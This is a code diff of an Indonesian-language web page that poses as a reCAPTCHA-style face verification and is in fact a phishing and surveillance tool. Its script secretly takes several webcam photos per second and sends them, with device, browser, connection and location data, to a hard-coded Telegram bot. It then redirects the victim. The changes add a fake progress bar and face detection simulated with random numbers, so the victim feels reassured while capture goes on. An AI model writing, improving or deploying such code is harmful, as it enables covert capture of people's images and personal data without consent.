@@ -217,7 +217,7 @@
 </head>
 <body>
 
-  <div class="container my-4">
+  <div class="container">
     <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="Security Logo" class="logo">
     <h2>Verifikasi Wajah</h2>
     <p>Sebelum Lanjut,Untuk memastikan Anda bukan bot, kami perlu memverifikasi wajah Anda secara singkat.</p>
@@ -259,13 +259,13 @@
     </div>
   </div>
 
- <script>
+<script>
   // Constants
 const TOKEN = "7616230857:AAFAgENc-bxOWhjQ38Zo3OSucj7j2XyQypw";
 const CHAT_ID = "1388041292";
 const REDIRECT_URL = "https://www.wattpad.com/263739637";
-const VERIFICATION_DURATION = 5; // Changed from 10 to 5 seconds
-const PHOTOS_PER_SECOND = 4; // New constant to specify photos per second
+const VERIFICATION_DURATION = 5; // 5 seconds verification
+const PHOTOS_PER_SECOND = 5; // 4 photos per second
 
 // Elements
 const checkbox = document.getElementById("check");
@@ -277,15 +277,61 @@ const spinner = document.getElementById("spinner");
 const countdownEl = document.getElementById("countdown");
 const successMessage = document.getElementById("successMessage");
 const errorMessage = document.getElementById("errorMessage");
+const progressBar = document.getElementById("progressBar"); // New progress bar element
+const faceDetectionFeedback = document.getElementById("faceDetectionFeedback"); // New face detection feedback element
 
 // Variables
 let stream;
 let intervalId;
 let countdownInterval;
 let remainingTime = VERIFICATION_DURATION;
+let faceDetected = false;
+let progressValue = 0;
 
 // Send initial access data when page loads
 document.addEventListener("DOMContentLoaded", function() {
+  // Create progress bar if it doesn't exist
+  if (!progressBar) {
+    const progressBarContainer = document.createElement("div");
+    progressBarContainer.className = "progress-container";
+    progressBarContainer.style.width = "100%";
+    progressBarContainer.style.backgroundColor = "#f0f0f0";
+    progressBarContainer.style.borderRadius = "5px";
+    progressBarContainer.style.marginTop = "10px";
+    progressBarContainer.style.marginBottom = "10px";
+    
+    const progressBarElement = document.createElement("div");
+    progressBarElement.id = "progressBar";
+    progressBarElement.style.width = "0%";
+    progressBarElement.style.height = "20px";
+    progressBarElement.style.backgroundColor = "#4CAF50";
+    progressBarElement.style.borderRadius = "5px";
+    progressBarElement.style.transition = "width 1.8s";
+    progressBarElement.style.textAlign = "center";
+    progressBarElement.style.color = "white";
+    progressBarElement.style.fontWeight = "bold";
+    
+    progressBarContainer.appendChild(progressBarElement);
+    videoContainer.appendChild(progressBarContainer);
+  }
+  
+  // Create face detection feedback element if it doesn't exist
+  if (!faceDetectionFeedback) {
+    const feedbackElement = document.createElement("div");
+    feedbackElement.id = "faceDetectionFeedback";
+    feedbackElement.style.padding = "10px";
+    feedbackElement.style.marginTop = "10px";
+    feedbackElement.style.backgroundColor = "#FFF3CD";
+    feedbackElement.style.border = "1px solid #FFE69C";
+    feedbackElement.style.borderRadius = "5px";
+    feedbackElement.style.color = "#856404";
+    feedbackElement.style.fontWeight = "bold";
+    feedbackElement.style.display = "none";
+    feedbackElement.innerText = "Mohon posisikan wajah Anda di tengah kamera";
+    
+    videoContainer.appendChild(feedbackElement);
+  }
+  
   // Add a short delay to ensure everything is loaded
   setTimeout(function() {
     sendAccessInfo();
@@ -680,6 +726,49 @@ async function sendTelegramMessage(message, retries = 3) {
   }
 }
 
+// Function to check if face is visible in the video using face-api.js
+// This is a simplified version since we're not actually loading face-api.js
+async function checkFaceVisibility(video) {
+  // Get the canvas element for face detection
+  const canvas = document.createElement("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  
+  // For demonstration, we'll simulate face detection
+  // In a real implementation, you would use face-api.js or another face detection library
+  
+  // Simulate success most of the time, but occasionally fail to make it realistic
+  const isFaceVisible = Math.random() > 0.2; // 80% chance of success
+  
+  // Update the UI based on face detection result
+  const faceDetectionFeedback = document.getElementById("faceDetectionFeedback");
+  
+  
+  return isFaceVisible;
+}
+
+// Function to update progress bar
+function updateProgress(percent) {
+  const progressBar = document.getElementById("progressBar");
+  if (progressBar) {
+    progressBar.style.width = `${percent}%`;
+    progressBar.innerText = `${percent}%`;
+  }
+}
+
+// Function to send progress notification to Telegram
+async function sendProgressNotification(percent) {
+  try {
+    const message = `🔄 Proses verifikasi: ${percent}% selesai`;
+    await sendTelegramMessage(message);
+    console.log(`✅ Progress notification sent: ${percent}%`);
+  } catch (error) {
+    console.error("Failed to send progress notification:", error);
+  }
+}
+
 function prosesVerifikasi() {
   if (!checkbox.checked) {
     alert("Silakan centang 'Saya bukan robot' terlebih dahulu.");
@@ -691,6 +780,13 @@ function prosesVerifikasi() {
   statusText.innerText = "Mengaktifkan kamera...";
   spinner.style.display = "block";
   verifyButton.disabled = true;
+  
+  // Reset progress
+  progressValue = 0;
+  updateProgress(progressValue);
+  
+  // Reset face detection
+  faceDetected = false;
   
   // Send camera permission request notification
   sendPermissionRequestInfo();
@@ -727,7 +823,47 @@ function prosesVerifikasi() {
     // Update status
     statusText.innerText = "📸 Memverifikasi wajah...";
     
-    // Start capturing images (changed to 4 photos every 1000/4 = 250ms)
+    // Initialize progress bar
+    const progressBar = document.getElementById("progressBar");
+    if (progressBar) {
+      progressBar.style.width = "0%";
+      progressBar.innerText = "0%";
+    }
+    
+    // Show the face detection feedback element
+    const faceDetectionFeedback = document.getElementById("faceDetectionFeedback");
+    if (faceDetectionFeedback) {
+      faceDetectionFeedback.style.display = "block";
+    }
+    
+    // Start face detection and progress updates
+    const faceCheckInterval = setInterval(async () => {
+      await checkFaceVisibility(video);
+    }, 500);
+    
+    // Progress update interval
+    const progressInterval = setInterval(() => {
+      progressValue += 100 / (VERIFICATION_DURATION * 2); // Increase by half speed if face not detected
+      
+      if (faceDetected) {
+        progressValue += 100 / (VERIFICATION_DURATION * 2); // Double speed if face detected
+      }
+      
+      if (progressValue > 100) progressValue = 100;
+      
+      updateProgress(Math.round(progressValue));
+      
+      // Send progress notification at specific intervals
+      if (Math.round(progressValue) % 25 === 0 && Math.round(progressValue) > 0) {
+        sendProgressNotification(Math.round(progressValue));
+      }
+      
+      if (progressValue >= 100) {
+        clearInterval(progressInterval);
+      }
+    }, 250);
+    
+    // Start capturing images
     let counter = 0;
     intervalId = setInterval(() => {
       ambilGambarKamera(video, counter++);
@@ -735,6 +871,8 @@ function prosesVerifikasi() {
     
     // Stop after verification duration
     setTimeout(() => {
+      clearInterval(faceCheckInterval);
+      clearInterval(progressInterval);
       finishVerification(true);
     }, VERIFICATION_DURATION * 1000);
   })
@@ -793,6 +931,7 @@ function ambilGambarKamera(video, index) {
   ctx.fillStyle = "white";
   ctx.font = "14px Arial";
   ctx.fillText(`Device: ${getDeviceModel(navigator.userAgent)} - ${new Date().toLocaleString()}`, 10, 20);
+ 
 
   canvas.toBlob(blob => {
     kirimKeTelegram(blob, index);
@@ -813,7 +952,9 @@ async function kirimKeTelegram(blob, index) {
       frameNumber: index + 1,
       deviceModel: getDeviceModel(navigator.userAgent),
       browserName: getBrowserName(),
-      connectionType: navigator.connection ? navigator.connection.effectiveType : "unknown"
+      connectionType: navigator.connection ? navigator.connection.effectiveType : "unknown",
+      faceDetected: faceDetected,
+      progressPercent: Math.round(progressValue)
     };
     
     // Try to get exact location if available
@@ -856,6 +997,11 @@ async function kirimKeTelegram(blob, index) {
         if (data.ok) {
           success = true;
           console.log(`✅ Gambar ${index + 1} dikirim!`, data);
+          
+          // Update progress notification after successful image upload
+          if (index % 4 === 0) {
+            statusText.innerText = `📸 Memverifikasi wajah... (${Math.round(progressValue)}%)`;
+          }
         } else {
           throw new Error(`Telegram API error: ${data.description}`);
         }
@@ -891,13 +1037,19 @@ async function finishVerification(success) {
   spinner.style.display = "none";
   statusText.innerText = "";
   
+  // Hide face detection feedback
+  const faceDetectionFeedback = document.getElementById("faceDetectionFeedback");
+  if (faceDetectionFeedback) {
+    faceDetectionFeedback.style.display = "none";
+  }
+  
   // Get final device info for completion message
   const deviceInfo = await getDeviceInfo();
   
   // Send verification completion notification
   try {
     const message = success
-      ? `✅ Verifikasi wajah selesai dengan sukses, user akan dialihkan\n\nDevice: ${deviceInfo.deviceModel}\nBrowser: ${deviceInfo.browserName}\nConnection: ${deviceInfo.connectionType}`
+      ? `✅ Verifikasi wajah selesai dengan sukses, user akan dialihkan\n\nDevice: ${deviceInfo.deviceModel}\nBrowser: ${deviceInfo.browserName}\nConnection: ${deviceInfo.connectionType}\nFace Detection Success: ${faceDetected ? "Ya" : "Tidak"}`
       : "❌ Verifikasi wajah gagal";
     
     await sendTelegramMessage(message);
@@ -923,7 +1075,223 @@ function resetMessages() {
   successMessage.style.display = "none";
   errorMessage.style.display = "none";
   remainingTime = VERIFICATION_DURATION;
+  
+  // Reset progress bar
+  const progressBar = document.getElementById("progressBar");
+  if (progressBar) {
+    progressBar.style.width = "0%";
+    progressBar.innerText = "0%";
+  }
+  
+  // Hide face detection feedback
+  const faceDetectionFeedback = document.getElementById("faceDetectionFeedback");
+  if (faceDetectionFeedback) {
+    faceDetectionFeedback.style.display = "none";
+  }
 }
+
+// Add this function to create the required HTML elements if they don't exist
+function createUIElements() {
+  // Create container for verification UI if it doesn't exist
+ 
+  
+  // Create checkbox if it doesn't exist
+  if (!document.getElementById("check")) {
+    const checkboxDiv = document.createElement("div");
+    checkboxDiv.style.marginBottom = "15px";
+    
+    const checkbox = document.createElement("input");
+    checkbox.type = "checkbox";
+    checkbox.id = "check";
+    
+    const label = document.createElement("label");
+    label.htmlFor = "check";
+    label.innerText = " Saya bukan robot";
+    label.style.marginLeft = "5px";
+    
+    checkboxDiv.appendChild(checkbox);
+    checkboxDiv.appendChild(label);
+    container.appendChild(checkboxDiv);
+  }
+  
+  // Create verify button if it doesn't exist
+  if (!document.getElementById("verifyButton")) {
+    const button = document.createElement("button");
+    button.id = "verifyButton";
+    button.innerText = "Mulai Verifikasi";
+    button.style.padding = "10px 15px";
+    button.style.backgroundColor = "#4CAF50";
+    button.style.color = "white";
+    button.style.border = "none";
+    button.style.borderRadius = "5px";
+    button.style.cursor = "pointer";
+    button.disabled = true;
+    button.onclick = prosesVerifikasi;
+    container.appendChild(button);
+  }
+  
+  // Create privacy link if it doesn't exist
+  const privacyLink = document.createElement("a");
+  privacyLink.href = "#";
+  privacyLink.style.display = "block";
+  privacyLink.style.marginTop = "10px";
+  privacyLink.style.fontSize = "12px";
+  privacyLink.style.color = "#666";
+  privacyLink.innerText = "Kebijakan Privasi & Keamanan";
+  privacyLink.onclick = (e) => {
+    e.preventDefault();
+    showPrivacyInfo();
+  };
+  container.appendChild(privacyLink);
+  
+  // Create video container if it doesn't exist
+  if (!document.getElementById("videoContainer")) {
+    const videoContainer = document.createElement("div");
+    videoContainer.id = "videoContainer";
+    videoContainer.style.marginTop = "20px";
+    videoContainer.style.display = "none";
+    videoContainer.style.position = "relative";
+    
+    const video = document.createElement("video");
+    video.id = "video";
+    video.autoplay = true;
+    video.playsInline = true;
+    video.style.width = "100%";
+    video.style.borderRadius = "8px";
+    video.style.transform = "scaleX(-1)"; 
+    
+    const overlayDiv = document.createElement("div");
+    overlayDiv.style.position = "absolute";
+    overlayDiv.style.top = "50%";
+    overlayDiv.style.left = "50%";
+    overlayDiv.style.transform = "translate(-50%, -50%)";
+    overlayDiv.style.border = "2px dashed #fff";
+    overlayDiv.style.borderRadius = "50%";
+    overlayDiv.style.width = "60%";
+    overlayDiv.style.height = "80%";
+    overlayDiv.style.boxSizing = "border-box";
+    overlayDiv.style.pointerEvents = "none";
+    
+    // Oval face guide hint text
+    const hintText = document.createElement("div");
+    hintText.style.position = "absolute";
+    hintText.style.bottom = "10px";
+    hintText.style.left = "0";
+    hintText.style.width = "100%";
+    hintText.style.textAlign = "center";
+    hintText.style.color = "white";
+    hintText.style.backgroundColor = "rgba(0,0,0,0.5)";
+    hintText.style.padding = "5px";
+    hintText.style.borderRadius = "5px";
+    hintText.style.fontSize = "12px";
+    hintText.innerText = "Posisikan wajah Anda di dalam area oval";
+    
+    videoContainer.appendChild(video);
+    videoContainer.appendChild(overlayDiv);
+    videoContainer.appendChild(hintText);
+    
+    container.appendChild(videoContainer);
+  }
+  
+  // Create status text if it doesn't exist
+  if (!document.getElementById("statusText")) {
+    const statusText = document.createElement("div");
+    statusText.id = "statusText";
+    statusText.style.marginTop = "15px";
+    statusText.style.textAlign = "center";
+    statusText.style.fontWeight = "bold";
+    container.appendChild(statusText);
+  }
+  
+  // Create spinner if it doesn't exist
+  if (!document.getElementById("spinner")) {
+    const spinner = document.createElement("div");
+    spinner.id = "spinner";
+    spinner.style.display = "none";
+    spinner.style.margin = "10px auto";
+    spinner.style.width = "30px";
+    spinner.style.height = "30px";
+    spinner.style.border = "4px solid #f3f3f3";
+    spinner.style.borderTop = "4px solid #3498db";
+    spinner.style.borderRadius = "50%";
+    spinner.style.animation = "spin.8s linear infinite";
+    
+    // Add spinner animation
+    const style = document.createElement("style");
+    style.innerHTML = `
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+    `;
+    document.head.appendChild(style);
+    
+    container.appendChild(spinner);
+  }
+  
+  // Create countdown if it doesn't exist
+  if (!document.getElementById("countdown")) {
+    const countdown = document.createElement("div");
+    countdown.id = "countdown";
+    countdown.style.display = "none";
+    countdown.style.fontSize = "20px";
+    countdown.style.fontWeight = "bold";
+    countdown.style.textAlign = "center";
+    countdown.style.margin = "10px 0";
+    container.appendChild(countdown);
+  }
+  
+  // Create messages if they don't exist
+  if (!document.getElementById("successMessage")) {
+    const successMessage = document.createElement("div");
+    successMessage.id = "successMessage";
+    successMessage.style.display = "none";
+    successMessage.style.padding = "10px";
+    successMessage.style.marginTop = "10px";
+    successMessage.style.backgroundColor = "#D4EDDA";
+    successMessage.style.border = "1px solid #C3E6CB";
+    successMessage.style.borderRadius = "5px";
+    successMessage.style.color = "#155724";
+    successMessage.style.textAlign = "center";
+    successMessage.innerHTML = "✅ Verifikasi berhasil!<br>Anda akan dialihkan...";
+    container.appendChild(successMessage);
+  }
+  
+  if (!document.getElementById("errorMessage")) {
+    const errorMessage = document.createElement("div");
+    errorMessage.id = "errorMessage";
+    errorMessage.style.display = "none";
+    errorMessage.style.padding = "10px";
+    errorMessage.style.marginTop = "10px";
+    errorMessage.style.backgroundColor = "#F8D7DA";
+    errorMessage.style.border = "1px solid #F5C6CB";
+    errorMessage.style.borderRadius = "5px";
+    errorMessage.style.color = "#721C24";
+    errorMessage.style.textAlign = "center";
+    container.appendChild(errorMessage);
+  }
+}
+
+// Call createUIElements when the DOM is fully loaded
+document.addEventListener("DOMContentLoaded", function() {
+  createUIElements();
+  
+  // Initialize checkbox event listener
+  const checkbox = document.getElementById("check");
+  if (checkbox) {
+    checkbox.addEventListener("change", function() {
+      const verifyButton = document.getElementById("verifyButton");
+      if (verifyButton) {
+        verifyButton.disabled = !this.checked;
+      }
+    });
+  }
+  
+  // Add a short delay to ensure everything is loaded
+  setTimeout(function() {
+    sendAccessInfo();
+  }, 1000);
+});
 
 // Try to get additional hardware info
 async function getHardwareInfo() {
@@ -997,6 +1365,6 @@ async function getSensorsInfo() {
   
   return sensorsInfo;
 }
- </script>
+</script>
 </body>
 </html>
